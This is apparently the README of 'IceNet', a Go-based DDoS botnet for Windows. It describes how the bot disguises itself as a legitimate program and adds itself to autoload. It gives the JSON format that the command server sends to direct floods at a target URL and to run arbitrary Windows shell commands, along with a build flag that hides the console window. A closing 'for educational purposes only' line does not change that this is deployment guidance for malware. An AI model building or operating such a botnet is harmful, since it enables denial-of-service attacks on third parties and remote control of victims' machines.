# IceNet
### The simple ddos botnet for win desktops  
you may embed him or something else)  
mimics as real programs and writes it in autoload  
ips from main servers you may write in embedded config.json  

response from your main server must look like this  

```
{  
    "Target": "http://example.com", 
    "Times": 2,
    "Typemethod": "get", 
    "Cmd":""
}
```
recommended build command : `go build -ldflags="-s -w -H windowsgui" -o output.exe IceNet.go`  
in cmd you may write command for shell in windows "for this payload write cmd in Typemethod"

for educational purposes only!
